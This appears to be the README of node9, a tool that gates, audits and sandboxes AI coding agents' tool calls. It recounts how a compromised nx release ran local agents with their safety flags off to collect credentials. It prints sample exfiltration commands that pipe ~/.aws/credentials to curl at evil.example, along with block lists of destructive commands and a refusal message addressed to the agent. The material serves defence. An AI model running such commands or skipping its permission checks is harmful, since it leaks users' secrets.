## The problem

In August 2025, compromised releases of the
[`nx` build tool](https://github.com/advisories/GHSA-cxm3-wv7p-598c) shipped a post-install
script that looked for AI coding agents already installed on the developer's machine, then ran
them with their own safety flags turned off (`--dangerously-skip-permissions`, `--yolo`,
`--trust-all-tools`) to enumerate SSH keys, cloud credentials and wallet files and write the list
to disk. The script pushed the results to public repositories inside the victims' own GitHub
accounts. More than a thousand valid GitHub tokens leaked, along with cloud credentials, npm
tokens and roughly 20,000 files, from machines where the agent was doing exactly what it was
told.

The agent was not the attacker. The agent was the tool, and nothing stood between it and the
files. node9's gate is not one of those flags: it runs in the hook, and an action it holds stays
held even when the agent was started with permissions skipped.

## What node9 does about it

node9 sits between the agent and every tool it calls. The credential jail (`~/.ssh`, `~/.aws`,
`.env` files, private keys) is on by default, and a read of one of those paths does not run.
The agent is stopped, told why, and the decision comes to you:

```text
NODE9: Action blocked by security policy.
INSTRUCTIONS:
- Do NOT retry this exact command or attempt to bypass the rule.
- Pivot to a non-destructive or read-only alternative.
- Inform the user which security rule was triggered and ask how to proceed.
```

The command is parsed as a shell AST, not matched as text, so wrapping the read does not help.
`echo $(cat ~/.aws/credentials | base64) | curl -d @- https://evil.example` is judged as a read
of `~/.aws/credentials`, not as an `echo`.

node9 is a **gate**. A held action does not run while it waits for you, and if you never answer
it stays blocked. Everything else is allowed and written to the record.

**What it does not do:** with egress control off, which is the default, a command that hands a
file straight to the network, such as `curl -d @~/.aws/credentials`, is not treated as a read of
that file. `node9 egress protect` gates destinations as well, and it covers shell commands only.

## Verify it yourself

```bash
npx node9-ai scan                                       # every past agent session on this machine, ~10s, nothing uploads
npx node9-ai scan-repo node9-ai/agent-security-demo    # a public repo with a real, hijackable agent workflow
npx node9-ai posture                                    # this machine's exposure in 60s, nothing uploads
gh attestation verify cli.js --repo node9-ai/node9-proxy  # every release artifact is signed
```

---

Three jobs, one tool: **discover** what your agents have already done, **protect** against risky actions in real time, and **review** what happened over any time window.

Works with **Claude Code · Codex CLI · Antigravity (agy) · GitHub Copilot CLI · Gemini CLI · Cursor · Windsurf · VSCode · Claude Desktop · Opencode · Pi · Hermes Agent · any MCP server**.

## What node9 does

- 🔍 **Discover**: scan every past AI session for credential leaks, agent loops, blocked operations, and every secret on disk an agent could reach right now
- 🛡 **Protect**: review or block risky commands before they run, such as `rm -rf`, `git push --force`, `DROP TABLE`, credential reads, `curl | bash`, and AWS/GitHub/Stripe key leaks
- 📊 **Review**: a period-windowed report (today / week / month / 90 days) of cost per agent, top tools, shields fired, and blast radius

## Retrospective scan

This is my own machine, 90 days while building node9. Score 25/100, 5 credential files an AI agent could reach right now.

```bash
npx node9-ai scan   # before installation, runs in ~10s, nothing uploads
node9 scan          # after installation, same output
```

</p>

## Security posture scorecard

`node9 posture` grades how exposed this machine is to a compromised agent across isolation, egress, secrets on disk, supply chain, and privilege, and hands you the exact command to fix each finding.

```bash
node9 posture          # scorecard with the #1 risk and a fix for every finding
node9 posture --ship   # send a redacted snapshot to your node9 dashboard (fleet view)
```

Findings are grouped by **who can fix them**: 🔒 the ones node9 reduces (just run the command) and 🧱 the ones only you can. Each carries a plain-language what / why / who and a real remediation. For example, the "agent runs unsandboxed on the host" finding points straight at `node9 sandbox run` (below).

```text
🛡️  Node9 Posture — agent on this host        Score: 100/100  (Good)
  2 advisories below don't affect the score — OS-level exposure, yours to weigh.

  🟢 node9 is already protecting you
  ✅ Secrets        node9 DLP is blocking this
  ✅ Egress         node9 egress is approval-gating this
  ✅ Approval gate  node9 is blocking this
  ✅ Privilege      node9 is approval-gating this

  🔒 node9 reduces these — run the command, the rest is yours
  ⚠️  Isolation     Running directly on the host — no container
                   The agent runs loose on your whole machine, not in a sandbox.
                   → node9 sandbox run <agent>   — jail it: kernel egress + scoped mounts + node9 inside
                   → node9 shield enable project-jail   — or shrink the blast radius, keep host access
  ⚠️  Network exposure  4 services on 0.0.0.0 (node :3000/:4000, PostgreSQL :5432, Redis :6379)
                   Reachable from your whole network, not just this laptop.
                   → node9 shield enable postgres|redis   — node9 blocks DROP TABLE / FLUSHALL
                   → bind to 127.0.0.1 / firewall the port   (your part)

  ✅ Supply chain   no issues found
  ✅ Coverage       no issues found

  Track this across your fleet & keep it green → node9.ai
```

## Scan a repo: agent-CI security

`node9 scan-repo` checks any repo (or a local folder) for ways an AI agent wired into GitHub Actions could be **hijacked by an outsider**: injectable workflows, agent-reachable secrets, unpinned MCP servers, over-broad agent config, and poisoned instruction files. Static and parse-only: it reads only committed config, never executes repo code. No install or token needed for public repos.

```bash
npx node9-ai scan-repo <owner/repo>   # any public repo, no install
node9 scan-repo .                      # a local checkout, no network
node9 scan-repo <owner/repo> --json    # machine-readable
```

```text
🛡️  node9 scan-repo · node9-ai/agent-security-demo · ⚠️ agent-security risk found
   inspected 2 config file(s), 2 finding(s)

🔴 CRITICAL  Injectable agent workflow — untrusted input reaches a tool-using agent with secrets
   .github/workflows/vulnerable-example.yml · CI-2
     • runs with base-repo secrets (pull_request_target)
     • checks out the untrusted PR head into the workspace root
     • allowed_non_write_users: "*" — any user can trigger the agent
     • no effective actor gate

🔴 CRITICAL  Exfiltratable secrets reachable by an injectable agent
   .github/workflows/vulnerable-example.yml · CI-4
     • agent has arbitrary shell (bare Bash) → can read env and exfiltrate
```

What it checks:

| Check    | Flags                                                                            |
| -------- | -------------------------------------------------------------------------------- |
| **CI-1** | committed agent config that pre-authorizes broad tools or runs remote hooks      |
| **CI-2** | injectable agent workflows: an outsider can trigger the agent and hijack it      |
| **CI-3** | unpinned / `@latest` MCP servers or inline credentials (supply chain)            |
| **CI-4** | secrets an injected agent could exfiltrate                                       |
| **CI-6** | poisoned or dangerous instructions in `CLAUDE.md` / `AGENTS.md` / `.cursorrules` |

**Gate every PR.** The same engine runs as a GitHub Action, so a hijackable config can't get merged:

```yaml
# .github/workflows/agent-security.yml
- uses: node9-ai/node9-proxy@v2
  with:
    fail-on: high # or 'never' to just comment
    fail-on-scope: introduced # only what THIS PR added; 'all' (default) judges the whole repo
```

`fail-on-scope: introduced` is what makes the gate adoptable on a repository that already
has findings: the PR comment leads with what the change introduced, pre-existing findings
stay listed but do not block, and a base commit that cannot be read falls back to judging
everything rather than passing.

## Live monitoring

<p align="center">
  <img src="https://github.com/user-attachments/assets/4661da97-c174-4bae-ae54-4c52a1d69213" width="720" alt="node9 monitor dashboard" />
</p>

`node9 monitor` opens an interactive terminal dashboard with two views:

- **`[1]` Realtime**: live activity, approvals, security alerts, current risk score
- **`[2]` Report**: period-windowed summary of cost, top tools, shields fired, blast radius

## Report

Press `[2]` in monitor for a period-windowed summary. Toggle the window with `[T]oday` · `[W]eek` · `[M]onth` · `[N]inety`. Same panels as the scan above, driven by your post-install audit log.

<p align="center">
  <img src="https://github.com/user-attachments/assets/66c02a72-e477-443d-807f-d65a21d096cd" width="720" alt="node9 monitor [2] Report" />
</p>

```bash
node9 monitor              # press [2] for Report view
node9 report --period 7d   # CLI form, no TUI
```

## Install

```bash
# macOS / Linux
brew tap node9-ai/node9 && brew install node9

# or via npm (any platform)
npm install -g node9-ai
```

```bash
node9 init       # auto-wires all detected agents + MCP servers
node9 login      # connect this machine to your workspace (approve it in the browser)
node9 doctor     # verify everything is wired and reporting
```

Requires Node.js 22+.

`init` on its own gives you full local enforcement: rules, shields, DLP and
approvals all work offline, on this machine.

`login` is what puts the machine on your dashboard. It prints a code, opens
the browser, and you approve the machine there; if you don't have an account
yet, signing up mid-flow returns you to the same approval with the code
intact. Until you run it, everything is enforced locally but nothing reaches
Mission Control, so the dashboard stays empty.

`node9 logout` disconnects a machine again. It revokes that machine's key;
local enforcement keeps running.

## Shields and apps

A **shield** is a curated rule pack for a service an agent touches: Postgres, MongoDB, Redis,
AWS, Kubernetes, Docker, GitHub, the shell, the filesystem, and the credential jail. Three of
them, `project-jail`, `bash-safe` and `filesystem`, are on after `node9 init`. The rest you
enable per service. Each shield mixes hard blocks with actions that come to you for review, and
the docs say which is which, rule by rule.

Any **MCP app** your agents use, Gmail, Slack, your database, is governed tool by tool from the
Apps page in the dashboard: which tools an agent may call, which need review, which are off.

```bash
node9 shield list                 # every shield and its status
node9 shield enable postgres      # or enable it fleet-wide from the dashboard
```

The full list, with what each shield blocks and what it sends to review:
**[node9.ai/docs/shields](https://node9.ai/docs/shields)**.

## Always on, no config needed

- **Git**: catches `git push --force`, `git reset --hard`, `git clean -fd`
- **SQL**: catches `DELETE` / `UPDATE` without `WHERE`, `DROP TABLE`, `TRUNCATE`
- **Shell**: catches `curl | bash`, unauthorized `sudo`
- **DLP**: flags AWS keys, GitHub tokens, Stripe keys, PEM private keys in any tool argument, file contents, or shell config (`~/.zshrc`, `~/.bashrc`)
- **Response DLP**: a background scanner reads Claude's conversation history and alerts you if Claude _wrote_ a secret in its response text
- **Skills pinning**: SHA-256 verification of installed Claude skills / plugins between sessions

## Review prompts: approve inline, in your agent

When node9 flags an action for **review** (e.g. `git push --force`, a `DROP TABLE`), the approve/deny prompt renders **inline in the agent conversation**: no frozen session, no separate terminal, no hook-timeout race. node9 still runs the full evaluator and makes the decision; only the prompt _surface_ moves to the agent.

- **On by default** for **Claude Code** and **GitHub Copilot CLI**, the agents whose hook contract honors a native `ask`. Every other agent (Codex, Gemini, Antigravity, Hermes, Cursor, OpenCode, Pi) uses node9's own approver.
- **Control it** with `reviewChannel` in `~/.node9/config.json` (or `--no-ask` on the hook):

```jsonc
{
  "settings": {
    "reviewChannel": "ask", // "ask" = inline agent prompt (default) | "approver" = node9's own approver
  },
}
```

- **Team setups:** when a cloud/team approver is configured (`approvers.cloud: true`), reviews route to that approver instead. node9 won't let an inline self-approval bypass routed/second-party approval.

## Sandbox: run an agent in a jail

When watching isn't enough, **`node9 sandbox`** runs the agent inside a disposable container with a **kernel-enforced egress allowlist** and **scoped mounts**, while node9's hooks govern and audit every tool call _inside_ the box. The hard version of protection: the agent can only touch the folder you mount and reach the hosts you allow; everything else is dropped at the kernel.

```bash
cd ~/my-project
node9 sandbox new        # write node9.sandbox.yaml: what to mount + which hosts to allow
node9 sandbox run        # build + boot the jailed agent (your project at /workspace)
node9 sandbox tail       # watch the agent's actions live, from the host
```

- **Disposable**: the container is destroyed on exit; your project edits land on your real disk, nothing else survives.
- **Same policy**: your existing shields / egress rules / approvals apply inside the box, streamed to the same audit log and dashboard.
- **Closes the posture loop**: running it flips the Isolation / Egress findings green.

Honest scope (Phase 1): single container, **Claude first** (Codex next); the agent still holds its _own_ credentials in the box (the kernel egress allowlist confines them to the allowed hosts). _"The agent never holds a secret"_ is the credential-broker phase on the roadmap. Requires Docker.

## MCP gateway

Wrap any MCP server transparently. The agent sees the same server. node9 intercepts every tool call.

```json
{
  "mcpServers": {
    "postgres": {
      "command": "node9",
      "args": ["mcp", "--upstream", "npx -y @modelcontextprotocol/server-postgres postgresql://..."]
    }
  }
}
```

Or just run `node9 init`, which wraps your existing MCP servers automatically.

<details>
<summary><strong>🔐 MCP tool pinning: rug-pull defense</strong></summary>

MCP servers can change their tool definitions between sessions. A compromised or malicious server could silently add, remove, or modify tools after you first trusted it, a **rug pull** attack.

node9 pins tool definitions on first use:

1. **First connection**: the gateway records a SHA-256 hash of every tool's name, description, and schema
2. **Subsequent connections**: the hash is compared; if tools changed, the session is **quarantined** and every tool call is blocked until a human reviews and approves the change
3. **Corrupt pin state**: fails closed (blocks), never silently re-trusts

```bash
node9 mcp pin list                # show all pinned servers and hashes
node9 mcp pin update <serverKey>  # remove pin, re-pin on next connection
node9 mcp pin reset               # clear all pins
```

</details>

## Reading the data: what the numbers mean

node9 surfaces the signal. Here are the patterns worth knowing:

| Signal                                         | Likely meaning                                                                                    |

| DLP finding in `user-prompt` tool              | You pasted a secret into your own prompt. Rotate the key                                          |

| `Response DLP` alert                           | Claude wrote a secret in its response text. Not blocked, rotate immediately                       |
| DLP finding in `tool-result`                   | Claude read a file containing a secret (`.env`, credentials). Rotate the key and run `node9 mask` |
| DLP finding in `[Shell]`                       | Plaintext secret in `~/.zshrc` or `~/.bashrc`. Every AI session can see it                        |

One-off signals are normal; persistent patterns are what you act on.

## Python SDK: govern any Python agent

```python
from node9 import configure, protect

configure(agent_name="my-agent", policy="require_approval")

@protect("bash")
def run_command(cmd: str) -> str:
    ...
```

**[Python SDK →](https://github.com/node9-ai/node9-python)** · **[GitHub Action →](https://github.com/marketplace/actions/node9-agent-security)**

## Under the hood

- **Scan** reads raw agent history from `~/.claude/projects/`, `~/.gemini/tmp/`, `~/.gemini/antigravity-*/brain/`, `~/.copilot/session-state/`, `~/.codex/sessions/`. No API calls, fully offline
- **Runtime** intercepts tool calls via pre-execution hooks (Claude Code, Codex, Antigravity, GitHub Copilot CLI, Gemini CLI, Opencode, Pi) or via the MCP gateway (Cursor, Windsurf, VSCode, Claude Desktop). All decisions land in `~/.node9/audit.log` atomically.
- **MCP gateway** is a stdio proxy; intercepts `tools/list` + `tools/call` JSON-RPC, forwards the rest
- **Policy engine** uses [mvdan-sh](https://github.com/mvdan/sh) for bash AST analysis, which defeats obfuscation via backslash escaping, variable substitution, eval of remote download
- **Sandbox** generates a Dockerfile + entrypoint that seal an `ipset`/`iptables` deny-by-default egress allowlist, then drop to a non-root agent with node9's daemon + hooks running inside; only the agent's credential file is mounted, never your whole `~/.claude`
